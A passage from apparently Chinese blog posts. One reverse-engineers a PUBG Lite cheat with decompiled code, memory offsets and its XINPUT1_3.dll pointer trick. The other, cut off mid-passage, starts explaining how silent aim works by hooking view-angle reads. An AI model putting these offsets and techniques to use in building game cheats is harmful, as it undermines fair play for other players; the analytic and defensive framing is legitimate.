dword_4DF2F4,</span><br><span class=\"line\">        v26,</span><br><span class=\"line\">        <span class=\"built_in\">HIDWORD</span>(v26),</span><br><span class=\"line\">        <span class=\"number\">0</span>);</span><br><span class=\"line\">    lpMem = &amp;v18;                               <span class=\"comment\">// 对目标地址写0</span></span><br><span class=\"line\">    v3 = <span class=\"built_in\">sub_40D2C1</span>(<span class=\"number\">28</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( lpMem != &amp;v18 )</span><br><span class=\"line\">      <span class=\"built_in\">sub_40D2BB</span>((LPCSTR)<span class=\"number\">6</span>);</span><br><span class=\"line\">    <span class=\"built_in\">HIDWORD</span>(v21) = v3;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !v3 )</span><br><span class=\"line\">      (*(<span class=\"built_in\">void</span> (__stdcall **)(LPVOID *, <span class=\"type\">int</span>, _DWORD, _DWORD, <span class=\"type\">signed</span> <span class=\"type\">int</span>))(*(_DWORD *)dword_4DF300 + <span class=\"number\">64</span>))(</span><br><span class=\"line\">        &amp;dword_4DF300,</span><br><span class=\"line\">        dword_4DF2F4,</span><br><span class=\"line\">        v26,</span><br><span class=\"line\">        <span class=\"built_in\">HIDWORD</span>(v26),</span><br><span class=\"line\">        <span class=\"number\">0x3F000000</span>);                            <span class=\"comment\">// 对目标地址写0.5</span></span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p>![Untitled%2017](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 17.png)</p>\n<p>首先是获取一个对象地址，然后让该地址+0x14d8第一层，再加上0x458得到目标地址，最后对该地址写入0就实现了屏息。其他功能都是一样的，现在我们返回函数头部按下X跳出去看看。<br>我们发现跳出来了还是这个地方。现在我们又分析完了一个，那么现在怎么去分析其他函数呢？</p>\n<p>![Untitled%2018](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 18.png)</p>\n<p>还记得这里吗，它这个数据怎么来我们还不知道，但是我们知道他肯定也是绘制循环里的，而且肯定是本人对象**(屏息就是我们自身的呼吸，所以肯定是在本人对象下的)**，因为他要时时更新游戏数据。我们看看交叉引用，找什么地方给他赋值的。</p>\n<p>![Untitled%2019](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 19.png)</p>\n<p>中间的是我们这个功能函数里的，并不是我们要找的。我们就看第一个</p>\n<p>![Untitled%2020](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 20.png)</p>\n<p>我们来到这，发现他来源另一个值，我们看看另一个值怎么来。<br>我们发现它来源于V5，而v5又是读一个值得到的，那么再往上看，就会发现这里其实就是再遍历对象数组。</p>\n<p>![Untitled%2021](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 21.png)</p>\n<p>64位一个地址相差刚刚好是0x8。知道这个后，这一段的代码其实已经很清晰，首先去遍历对象数组，然后去判断血量是否&gt;0和&lt;&#x3D;100，成立的话就是继续判断是否为本人或者敌人，再成立的话，就进行一个本人对象的赋值和读取对象坐标。这里贴分析后注释的代码。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">HIDWORD</span>(v57) = v1 + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">LODWORD</span>(v57) = v2;</span><br><span class=\"line\">    *v2 = v1 + <span class=\"number\">1</span>;</span><br><span class=\"line\">    v56 = v3;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v1 + <span class=\"number\">1</span> &gt; v3 )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( dword_4DF39C &gt;= v69 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *(<span class=\"type\">double</span> *)lpMem = (<span class=\"type\">double</span>)v69;           <span class=\"comment\">// 遍历</span></span><br><span class=\"line\">      v4 = <span class=\"built_in\">toInt64</span>((<span class=\"type\">double</span>)ActorArray + (*(<span class=\"type\">double</span> *)lpMem - <span class=\"number\">1.0</span>) * <span class=\"number\">8.0</span>);<span class=\"comment\">// actor+（i-1）*8</span></span><br><span class=\"line\">      <span class=\"built_in\">LODWORD</span>(v5) = (*(<span class=\"built_in\">int</span> (__stdcall **)(LPVOID *, <span class=\"type\">int</span>, _DWORD, _DWORD, <span class=\"type\">int</span>, <span class=\"type\">int</span> *, _DWORD))(*(_DWORD *)dword_4DF300</span><br><span class=\"line\">                                                                                            + <span class=\"number\">44</span>))(</span><br><span class=\"line\">                      &amp;dword_4DF300,</span><br><span class=\"line\">                      dword_4DF2F4,</span><br><span class=\"line\">                      v4,</span><br><span class=\"line\">                      <span class=\"built_in\">HIDWORD</span>(v4),</span><br><span class=\"line\">                      v56,</span><br><span class=\"line\">                      v2,</span><br><span class=\"line\">                      <span class=\"built_in\">HIDWORD</span>(v57));            <span class=\"comment\">// 读取对象</span></span><br><span class=\"line\">      Object = v5;</span><br><span class=\"line\">      lpMem[<span class=\"number\">1</span>] = <span class=\"string\">&quot;A90&quot;</span>;                         <span class=\"comment\">// 0xA90 血量偏移</span></span><br><span class=\"line\">      lpMem[<span class=\"number\">0</span>] = (LPVOID)<span class=\"built_in\">HexToDec</span>(&amp;lpMem[<span class=\"number\">1</span>]);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( lpMem[<span class=\"number\">1</span>] )</span><br><span class=\"line\">        <span class=\"built_in\">FreeMem</span>(lpMem[<span class=\"number\">1</span>]);</span><br><span class=\"line\">      v57 = <span class=\"built_in\">toInt64</span>((<span class=\"type\">double</span>)Object + (<span class=\"type\">double</span>)(<span class=\"type\">signed</span> <span class=\"type\">int</span>)lpMem[<span class=\"number\">0</span>]);<span class=\"comment\">// 得到血量地址</span></span><br><span class=\"line\">      v56 = dword_4DF2F4;</span><br><span class=\"line\">      v67 = <span class=\"built_in\">COERCE_FLOAT</span>((*(<span class=\"built_in\">int</span> (__stdcall **)(LPVOID *))(*(_DWORD *)dword_4DF300 + <span class=\"number\">0x3C</span>))(&amp;dword_4DF300));<span class=\"comment\">// 读取血量</span></span><br><span class=\"line\">      *(<span class=\"type\">double</span> *)lpMem = v67;</span><br><span class=\"line\">      v6 = v67 &gt; <span class=\"number\">0.0000001</span> &amp;&amp; v67 - <span class=\"number\">100.0</span> &lt;= <span class=\"number\">0.0000001</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v6 )                                 <span class=\"comment\">// 血量&gt;0 且 血量&lt;=100</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        *(<span class=\"type\">double</span> *)lpMem = (<span class=\"type\">double</span>)Object;</span><br><span class=\"line\">        v7 = <span class=\"built_in\">toInt64</span>(*(<span class=\"type\">double</span> *)lpMem + <span class=\"number\">792.0</span>); <span class=\"comment\">// 0x318</span></span><br><span class=\"line\">        <span class=\"built_in\">LODWORD</span>(v8) = (*(<span class=\"built_in\">int</span> (__stdcall **)(LPVOID *, <span class=\"type\">int</span>, _DWORD, _DWORD, <span class=\"type\">int</span>, _DWORD, _DWORD))(*(_DWORD *)dword_4DF300</span><br><span class=\"line\">                                                                                               + <span class=\"number\">44</span>))(</span><br><span class=\"line\">                        &amp;dword_4DF300,</span><br><span class=\"line\">                        dword_4DF2F4,</span><br><span class=\"line\">                        v7,</span><br><span class=\"line\">                        <span class=\"built_in\">HIDWORD</span>(v7),</span><br><span class=\"line\">                        v56,</span><br><span class=\"line\">                        v57,</span><br><span class=\"line\">                        <span class=\"built_in\">HIDWORD</span>(v57));</span><br><span class=\"line\">        v9 = <span class=\"built_in\">toInt64</span>((<span class=\"type\">double</span>)v8 + <span class=\"number\">32.0</span>);        <span class=\"comment\">// 0x20</span></span><br><span class=\"line\">        <span class=\"built_in\">LODWORD</span>(v10) = (*(<span class=\"built_in\">int</span> (__stdcall **)(LPVOID *, <span class=\"type\">int</span>, _DWORD, _DWORD))(*(_DWORD *)dword_4DF300 + <span class=\"number\">44</span>))(</span><br><span class=\"line\">                         &amp;dword_4DF300,</span><br><span class=\"line\">                         dword_4DF2F4,</span><br><span class=\"line\">                         v9,</span><br><span class=\"line\">                         <span class=\"built_in\">HIDWORD</span>(v9));</span><br><span class=\"line\">        v60 = (<span class=\"type\">double</span>)v10 + <span class=\"number\">448.0</span>;              <span class=\"comment\">// 0x1C0</span></span><br><span class=\"line\">        v66 = <span class=\"built_in\">toInt64</span>(v60);</span><br><span class=\"line\">        lpMem[<span class=\"number\">1</span>] = <span class=\"string\">&quot;5E8&quot;</span>;                       <span class=\"comment\">// 5E8</span></span><br><span class=\"line\">        lpMem[<span class=\"number\">0</span>] = (LPVOID)<span class=\"built_in\">HexToDec</span>(&amp;lpMem[<span class=\"number\">1</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( lpMem[<span class=\"number\">1</span>] )</span><br><span class=\"line\">          <span class=\"built_in\">FreeMem</span>(lpMem[<span class=\"number\">1</span>]);</span><br><span class=\"line\">        v57 = <span class=\"built_in\">toInt64</span>((<span class=\"type\">double</span>)v66 + (<span class=\"type\">double</span>)(<span class=\"type\">signed</span> <span class=\"type\">int</span>)lpMem[<span class=\"number\">0</span>]);</span><br><span class=\"line\">        v56 = dword_4DF2F4;</span><br><span class=\"line\">        v65 = (*(<span class=\"built_in\">int</span> (__stdcall **)(LPVOID *))(*(_DWORD *)dword_4DF300 + <span class=\"number\">0x1C</span>))(&amp;dword_4DF300);<span class=\"comment\">// 这里通过CE查看发现读取的是v64+0x5E8位置</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v65 == <span class=\"number\">1</span> )                         <span class=\"comment\">// 判断是否为本人</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          MySelftAddr = Object;</span><br><span class=\"line\">          qword_4DF3B0 = v66;                   <span class=\"comment\">// 读取坐标需要的地址</span></span><br><span class=\"line\">          lpMem[<span class=\"number\">1</span>] = dword_4DF3B8;              <span class=\"comment\">// 开始读坐标</span></span><br><span class=\"line\">          v11 = (*(<span class=\"built_in\">int</span> (__stdcall **)(LPVOID *, <span class=\"type\">int</span>, _DWORD, _DWORD))(*(_DWORD *)dword_4DF300 + <span class=\"number\">60</span>))(</span><br><span class=\"line\">                  &amp;dword_4DF300,</span><br><span class=\"line\">                  dword_4DF2F4,</span><br><span class=\"line\">                  v66,</span><br><span class=\"line\">                  <span class=\"built_in\">HIDWORD</span>(v66));   <span class=\"comment\">//X</span></span><br><span class=\"line\">          *(_DWORD *)lpMem[<span class=\"number\">1</span>] = v11;</span><br><span class=\"line\">          lpMem[<span class=\"number\">1</span>] = (<span class=\"type\">char</span> *)dword_4DF3B8 + <span class=\"number\">4</span>;</span><br><span class=\"line\">          v12 = <span class=\"built_in\">toInt64</span>((<span class=\"type\">double</span>)qword_4DF3B0 + <span class=\"number\">4.0</span>);</span><br><span class=\"line\">          v13 = (*(<span class=\"built_in\">int</span> (__stdcall **)(LPVOID *, <span class=\"type\">int</span>, _DWORD, _DWORD))(*(_DWORD *)dword_4DF300 + <span class=\"number\">60</span>))(</span><br><span class=\"line\">                  &amp;dword_4DF300,</span><br><span class=\"line\">                  dword_4DF2F4,</span><br><span class=\"line\">                  v12,</span><br><span class=\"line\">                  <span class=\"built_in\">HIDWORD</span>(v12));  <span class=\"comment\">//Y</span></span><br><span class=\"line\">          *(_DWORD *)lpMem[<span class=\"number\">1</span>] = v13;</span><br><span class=\"line\">          lpMem[<span class=\"number\">1</span>] = (<span class=\"type\">char</span> *)dword_4DF3B8 + <span class=\"number\">8</span>;</span><br><span class=\"line\">          v14 = <span class=\"built_in\">toInt64</span>((<span class=\"type\">double</span>)qword_4DF3B0 + <span class=\"number\">8.0</span>);</span><br><span class=\"line\">          v15 = (*(<span class=\"built_in\">int</span> (__stdcall **)(LPVOID *, <span class=\"type\">int</span>, _DWORD, _DWORD))(*(_DWORD *)dword_4DF300 + <span class=\"number\">60</span>))(</span><br><span class=\"line\">                  &amp;dword_4DF300,</span><br><span class=\"line\">                  dword_4DF2F4,</span><br><span class=\"line\">                  v14,</span><br><span class=\"line\">                  <span class=\"built_in\">HIDWORD</span>(v14));   <span class=\"comment\">//Z</span></span><br><span class=\"line\">          *(_DWORD *)lpMem[<span class=\"number\">1</span>] = v15;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">       </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v3 = v56;</span><br><span class=\"line\">    v1 = <span class=\"built_in\">HIDWORD</span>(v57);</span><br><span class=\"line\">    v2 = (<span class=\"type\">int</span> *)v57;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v59 = v64;</span><br><span class=\"line\">  v44 = *(_DWORD *)v64;</span><br><span class=\"line\">  v45 = (LPVOID *)((<span class=\"type\">char</span> *)v64 + <span class=\"number\">4</span>);</span><br><span class=\"line\">  v46 = *(_DWORD *)v64 == <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *(_DWORD *)v64 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( j = (<span class=\"type\">int</span>)*v45; ; j *= (_DWORD)*v45 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ++v45;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !--v44 )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v44 = j;</span><br><span class=\"line\">    v46 = j == <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !v46 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v58 = v44;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( *v45 )</span><br><span class=\"line\">        <span class=\"built_in\">FreeMem</span>(*v45);</span><br><span class=\"line\">      ++v45;</span><br><span class=\"line\">      v44 = v58 - <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( v58 != <span class=\"number\">1</span> );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">FreeMem</span>(v59);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里只分析了本人，敌人的也一样而且敌人还额外去读取了一些值估计是其他的属性，这里就不列出来分析。现在按照同样的操作，函数头交叉引用返回出去。</p>\n<p>![Untitled%2022](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 22.png)</p>\n<p>依旧是熟悉的地方。那么接下来我们就来分析一下，它的对象数组怎么来的。</p>\n<p>![Untitled%2023](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 23.png)</p>\n<p>这个位置交叉引用。</p>\n<p>![Untitled%2024](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 24.png)</p>\n<p>直接看第一个。</p>\n<p>![Untitled%2025](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 25.png)</p>\n<p>返现这里来到它一个赋值的地方。它的值来源于<strong>V4</strong>，我们看看<strong>V4</strong>怎么来的。</p>\n<p>![Untitled%2026](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 26.png)</p>\n<p>这一段基本看完，大家可以下头部返回出去，还是可以到达那个绘制循环的。这里我就不跳了。这里直接分析<strong>Count_Addr</strong>的来源，因为对象数组他是来源于这个地址**-8**的。</p>\n<p>![Untitled%2027](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 27.png)</p>\n<p>同样直接看第一个。</p>\n<p>![Untitled%2028](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 28.png)</p>\n<p>看到<strong>count_addr</strong>被赋值后下面就开始特征码搜索，具体干嘛用后面会说。我们先分析<strong>count_addr</strong>的来源</p>\n<p>![Untitled%2029](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 29.png)</p>\n<p>![Untitled%2030](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 30.png)</p>\n<p>其实没有最后一句没有**+0x8<strong>的情况下，</strong>Count_Addr<strong>存的就是对象指针。你只分析到这里就以为完事了，那不可能。其实这里有一个猫腻，这个辅助很机灵，如果你只运行游戏然后去看</strong>XINPUT1_3.dll+0x500<strong>这个地方，你会发现这个地方一直为</strong>0(下图)**。</p>\n<p>他这一段的骚操作。其实就是读取<strong>XINPUT1_3.dll</strong>的句柄后加上<strong>0x400</strong>再加上<strong>0x100</strong>（<strong>我也不知道他为什么不直接+0x500</strong>）。然后读取这里面的值。</p>\n<p>![Untitled%2031](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 31.png)</p>\n<p>![Untitled%2032](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 32.png)</p>\n<p>但是如果你打开了辅助，你会发现，他这里的值被改变了。</p>\n<p>所以说他这里的值并不是本身就存在的，而是辅助给予赋值的。那么它里面的值怎么来的，咱们看下面。</p>\n<p>这里只截图了部分代码，但是我们可以看到他这里是在搜索特征码，我们如果再往下分析很难，因为交叉引用显示下面并没有对我们<strong>count_addr</strong>的地址进行写操作。我们先不管它在干嘛，我们去调试，从IDA返汇编代码记录它的地址，然后我们下断F8单步跟，查看在什么地方他的值被改变了。</p>\n<p>![Untitled%2033](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 33.png)</p>\n<p>通过CE看了一下，当我们执行完这个call后<strong>XINPUT1_3.dll+0x500</strong>的位置，里面由0变成了一个地址。说明这个地方，存在着对<strong>XINPUT1_3.dll+0x500</strong>这个地址的写操作，至于它这一段执行后得到什么值，写了什么值我不带大家去分析，因为这部分代码里的特征码，在我去搜索和对比后，发现其实搜索出来的就是一段对象的解密代码(<strong>PUBG lite数据都是加密了的</strong>)。</p>\n<p>![Untitled%2034](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 34.png)</p>\n<p>那么他解了什么密？那就和他函数头的操作有关了</p>\n<p>![Untitled%2035](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 35.png)</p>\n<p>他这里对游戏模块+偏移，可能就是游戏密文。通过读取游戏密文，然后特征码搜索出解密代码，按照解密代码去解密，就能得到明文地址，最后把明文地址写入<strong>XINPUT1_3.dll+0x500</strong>，这样，如果之后要遍历对象就直接读取这个位置的值，就无需解密了。所以这就是为什么只打开游戏，<strong>XINPUT1_3.dll+0x500</strong>的位置是0，而打开辅助之后就变了。我们在头部返回出去。</p>\n<p>![Untitled%2036](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 36.png)</p>\n<p>发现来到这里了。，然后我们再返回出去</p>\n<p>![Untitled%2037](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 37.png)</p>\n<p>又来到这里，那么这个函数就可以知道他就是去获取游戏的数据，然后给下面模块进行一个加工处理操作。这里基本上就分析完所有模块了，另外几个函数没去分析，因为他里面都是算法，没必要去分析，算法都是通用，网上一大堆。</p>\n<p><strong>DrawOther：</strong>估计是透视用，因为里面出现了矩阵算法，怎么知道的？看特征</p>\n<p>![Untitled%2038](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 38.png)</p>\n<p>这里判断视角，就是说算出来的人在不在屏幕上，再的话就继续操作，不在的话不进行操作，本部分由V16变量控制。</p>\n<p>**Sub_407549:**自瞄算法，很明显</p>\n<p>![Untitled%2039](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 39.png)</p>\n<h1 id=\"总结：\"><a href=\"#总结：\" class=\"headerlink\" title=\"总结：\"></a>总结：</h1><p>这次是我第一次对程序整个流程进行逆向和分析，所以想通过文章的形式记录下来，也可以顺便看看自己哪里写得不足，好让各位对我提出意见。我也通过这次去分析程序认识到了很多东西，其中就是字符串释放的和强制转换类型的一个认识。字符串释放使得不占用空间、32位程序通过double类型巧妙的对8字节地址进行操作，另外就是重新温习了一下浮点数操作的指令，不然就忘记了  &#x3D;。&#x3D;</p>\n<h1 id=\"心得：\"><a href=\"#心得：\" class=\"headerlink\" title=\"心得：\"></a>心得：</h1><p>接下来是一些心里话，如果有哪里说错，或者得罪的多多原谅。</p>\n<p>到这里基本上就把程序流程分析完了，可能这里会有人质疑，你就说了这么点就分析完了？其实我的确是分析完了，但是你没去分析，你听别人分析和讲解，觉得自己也行。但是如果给你一个陌生的程序，让你去分析他，可能短短几句功能性的代码都能耗费你几小时时间。逆向这个东西从来不是看谁了解的多，听得多，而是看谁做得多。逆向的确很迷人，能够让你撕开用户和底层那一层隔膜，但是他学习过程和付出的代价却很大，逆向是我目前学习到到现在最能吃经验和积累的一门技术。前段看雪的周年大会，钱老师(<strong>钱林松</strong>)上台说过最让我震撼的一句话就是：<strong>你给我一段反汇编代码，随便给，我一看就马上能知道他的C&#x2F;C++代码是怎么写的</strong>。其实这一句话不假，只要你逆向搞得多，看得多，多多少少也有这种能力，但是说随便给你一段反汇编代码，试问谁能看一下就能直接实现他C&#x2F;C++代码。这个就是靠积累和经验攒来了。我这篇文章写出来是为了记录我对这个程序的分析过程，写出来大家能不能看懂取决于我的文采行不行，但是在我分析完这个程序后，我反正是对这个程序的整个流程一清二楚，另外我之所以只分析部分是因为其他部分也是一样的，而且我也不可能把整个代码流程全部分析出来，一方面我懒，另一方面啰嗦。最后转一张图片，最近再看雪看到的，也让我很有感触。</p>\n<p>![Untitled%2040](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 40.png)</p>\n","categories":["GameHacker"]},{"title":"浅谈FPS子弹追踪实现以及防护","url":"/2024/04/21/%E6%B5%85%E8%B0%88FPS%E5%AD%90%E5%BC%B9%E8%BF%BD%E8%B8%AA%E5%AE%9E%E7%8E%B0%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4/","content":"<p>开场白和表情包我就不加了了，文采和资源没这么丰富，直接步入正题。本次聊聊的功能为目前fps较为热门功能：<strong>子弹追踪。</strong></p>\n<ul>\n<li><a href=\"https://bbs.pediy.com/user-home-826671.htm\">PlaneJun</a> ・2020-4-27 19:44</li>\n</ul>\n<p>开场白和表情包我就不加了了，文采和资源没这么丰富，直接步入正题。本次聊聊的功能为目前fps较为热门功能：<strong>子弹追踪。</strong></p>\n<h1 id=\"简单聊聊：\"><a href=\"#简单聊聊：\" class=\"headerlink\" title=\"简单聊聊：\"></a><strong>简单聊聊：</strong></h1><p>该功能呢早期主要是火在pubg系列的游戏，因为在类似pubg系列游戏中，自瞄显得稍微鸡助，然后某些大佬就弄出了这么一个功能，子弹追踪。其实它的一个效果与自瞄不同，自瞄的表现效果为准星死死锁住敌人。可子弹追踪的表现效果为子弹死死锁住敌人，也就是说准星在不需要锁住人的情况下开枪也能对敌人造成伤害，下面放一个图直观的感受一下。</p>\n<p><img src=\"/../images/GameHacker/%E6%B5%85%E8%B0%88FPS%E5%AD%90%E5%BC%B9%E8%BF%BD%E8%B8%AA%E5%AE%9E%E7%8E%B0%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4/image-20221019162621287.png\" alt=\"image-20221019162621287\"></p>\n<p>该gif为手机录制，所以画质很渣，但是不影响看效果。可以明显看到他虽然没有瞄准敌人，但是敌人却被打出了健康的绿色血液，这就是子弹追踪的效果。</p>\n<p>效果我们看到了，那么该功能的一个实现原理是什么呢？<strong>顾名思义，子弹追踪就是子弹追着人打嘛，只要对子弹下手就能实现了，看似如此可真是如此吗？那我们换一个思维模式，我们当前要实现一个功能是不是准星在无需瞄准人的前提下开枪也能对敌人造成伤害？那么只要我们实现了这个功能，那我们的这个功能是不是也能称之为子弹追踪？</strong>这两句话很关键，大家细品。只要弄清这两个问题后就不会再被‘’子弹‘’两个字给骗到了。另外，如果大家常年混在看雪里褥羊毛的话就会发现，其实早期就有人发布过一种子弹追踪的实现方式，那就是飞郁培训的大佬讲师任鸟飞。这里就直接上帖子链接，有兴趣的大家可以看看：<a href=\"https://bbs.pediy.com/thread-251701.htm\">https://bbs.pediy.com/thread-251701.htm</a>。</p>\n<p>除了修改击打区域达到子弹追踪，还有什么方法能达到吗？俗话说“条条道路通罗马”，那么该功能实现的方法肯定不止一种，就看你脑洞能不能想到。下面呢我讲举一种实现方法来讲解。</p>\n<h1 id=\"分析：\"><a href=\"#分析：\" class=\"headerlink\" title=\"分析：\"></a><strong>分析：</strong></h1><p>我不知道大家有没有仔细思考过一个根源问题，那就是为什么FPS存在准星这个东西？答案很简单：用来瞄准目标。所以我们能准星指哪打哪。可是问题来了，请问游戏是怎么知道我们准星瞄准的是哪里？打的是哪里？<strong>请注意，这里我说是两个问题。</strong>我相信大部分人都没有真正去思考过这个问题，因为他们基本上都把这两个问题归结为一个问题。其实在我们不断深层的挖掘这个问题的时候，答案已经显得容见。那就是游戏会不会把我们从瞄准到射击敌人的这个过程分为两个部分，一个是准星的变动(<strong>准星的变动所带来的的影响为视角的变动，下面我都以视角来描述</strong>)，另一个是实际射击。为了确认这两个想法是否正确，我们用游戏实践一下。第一步得找到视角的坐标，也就是鼠标XY。</p>\n<p><img src=\"/../images/GameHacker/%E6%B5%85%E8%B0%88FPS%E5%AD%90%E5%BC%B9%E8%BF%BD%E8%B8%AA%E5%AE%9E%E7%8E%B0%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4/image-20221019162630133.png\" alt=\"image-20221019162630133\"></p>\n<p>不难发现随着鼠标XY变化，视角也在变化，故第一个想法成立。我们来看看第二个，既然用于实际射击，那么在我们开枪的时候鼠标XY必定作为参数传进来，此时我们只需要找到开枪call下断，然后开一枪后看一下堆栈是否存在鼠标XY即可。</p>\n<p><img src=\"/../images/GameHacker/%E6%B5%85%E8%B0%88FPS%E5%AD%90%E5%BC%B9%E8%BF%BD%E8%B8%AA%E5%AE%9E%E7%8E%B0%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4/image-20221019162635080.png\" alt=\"image-20221019162635080\"></p>\n<p><img src=\"/../images/GameHacker/%E6%B5%85%E8%B0%88FPS%E5%AD%90%E5%BC%B9%E8%BF%BD%E8%B8%AA%E5%AE%9E%E7%8E%B0%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4/image-20221019162638119.png\" alt=\"image-20221019162638119\"></p>\n<p>断点断下后往下一翻，果然有鼠标XY，那么就说明从瞄准到射击的确分为两个部分。当我们确认这两个想法之后，好玩的事来了。我们回忆一下，我们是不是要实现一个<strong>准星在无需瞄准人的前提下开枪也能对敌人造成伤害</strong>的功能，那么我们是不是可以做一下手脚？<strong>当我们开枪的时候我们不用游戏本身所提供的视角坐标，而是用我们提供的坐标，这样就能在不影响原视角的情况下让子弹往我们提供的坐标射击</strong>，于是文章开头的那个效果图就出来了。至此，子弹追踪就已经实现。不过这种子弹追踪的实现方式在江湖中有它自己的名字—–<strong>视角追踪或静默自瞄</strong>。这里说一下，之所以也称之为静默自瞄，只因为该追踪本质上还是属于自瞄，只不过是我们原视角在不产生变动的情况下进行了自瞄。</p>\n<h1 id=\"实现：\"><a href=\"#实现：\" class=\"headerlink\" title=\"实现：\"></a><strong>实现：</strong></h1><p>分析也分析完了，那么怎么去实现呢？两种方式：</p>\n<p>第一种、需要大量的逆向功底，就是分析开枪call在什么时候被赋值了实际射击坐标，然后hook即可实现。</p>\n<p>第二种、有句古话“擒贼先擒王”，既然开枪的时候需要去读取视角坐标，那么我们就直接在访问视角坐标的代码段进行处理岂不美哉。</p>\n<p><strong>Tip: 第二种方法虽然不如第一种方法要求的技术含量高，但是根据本人这段时间的测试，发现很多游戏都能实现，并且危害性大。故讲解该种方法的实现，也希望游戏产商早日和谐该功能。</strong></p>\n<p>我们来访问一下视角坐标</p>\n<p><img src=\"/../images/GameHacker/%E6%B5%85%E8%B0%88FPS%E5%AD%90%E5%BC%B9%E8%BF%BD%E8%B8%AA%E5%AE%9E%E7%8E%B0%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4/image-20221019162642055.png\" alt=\"image-20221019162642055\"></p>\n<p>发现有三条，而且无论我们改变视角还是开枪，都不会出现新的访问，那么我们只能从这三条处理。我们抛开第三条不看，因为第三条是属于给视角坐标赋值语句，我们要看的只是访问语句。这样就只剩下两条了，我们先点击第一条看看。</p>\n<p><img 